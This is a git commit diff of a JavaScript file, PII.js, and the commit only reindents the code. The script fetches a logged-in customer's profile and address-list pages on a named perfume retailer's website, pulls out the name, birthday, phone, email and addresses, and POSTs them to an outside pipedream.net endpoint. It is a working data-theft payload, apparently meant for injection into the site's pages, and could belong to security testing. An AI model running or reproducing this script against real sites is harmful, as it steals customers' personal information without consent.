bd9cc3d364a049f754800ae9316c048b892a44c9
Hugo DELCROIX <91057582+HugoDELCROIX@users.noreply.github.com>
2024-11-28 15:26:15 +0100

    Update PII.js

--- PII.js
+++ PII.js
@@ -1,32 +1,32 @@
 fetch('https://www.franciskurkdjian.com/eu-en/editprofile')
-.then(response => response.text())
-.then(html => {
-const parser = new DOMParser();
-const doc = parser.parseFromString(html, 'text/html');
-
-const data = {
-  firstname: doc.querySelector('[name="dwfrm_profile_customer_firstname"]').value,
-  lastname: doc.querySelector('[name="dwfrm_profile_customer_lastname"]').value,
-  birthday: doc.querySelector('[name="dwfrm_profile_customer_birthday"]').value,
-  phone: doc.querySelector('[name="dwfrm_profile_customer_phone"]').value,
-  email: doc.querySelector('[name="dwfrm_profile_customer_email"]').value
-};
-
-return fetch('https://www.franciskurkdjian.com/eu-en/addresslist')
   .then(response => response.text())
-  .then(addressHtml => {
-    const addressDoc = parser.parseFromString(addressHtml, 'text/html');
-    const addressContainer = addressDoc.querySelectorAll('.container-address');
-    const addresses = Array.from(addressContainer).map(div => div.textContent.trim());
+  .then(html => {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
 
-    data.addresses = addresses;
+    const data = {
+      firstname: doc.querySelector('[name="dwfrm_profile_customer_firstname"]').value,
+      lastname: doc.querySelector('[name="dwfrm_profile_customer_lastname"]').value,
+      birthday: doc.querySelector('[name="dwfrm_profile_customer_birthday"]').value,
+      phone: doc.querySelector('[name="dwfrm_profile_customer_phone"]').value,
+      email: doc.querySelector('[name="dwfrm_profile_customer_email"]').value
+    };
 
-    return fetch('https://eozvxox830clw9r.m.pipedream.net', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    });
+    return fetch('https://www.franciskurkdjian.com/eu-en/addresslist')
+      .then(response => response.text())
+      .then(addressHtml => {
+        const addressDoc = parser.parseFromString(addressHtml, 'text/html');
+        const addressContainer = addressDoc.querySelectorAll('.container-address');
+        const addresses = Array.from(addressContainer).map(div => div.textContent.trim());
+
+        data.addresses = addresses;
+
+        return fetch('https://eozvxox830clw9r.m.pipedream.net', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+      });
   });
-});
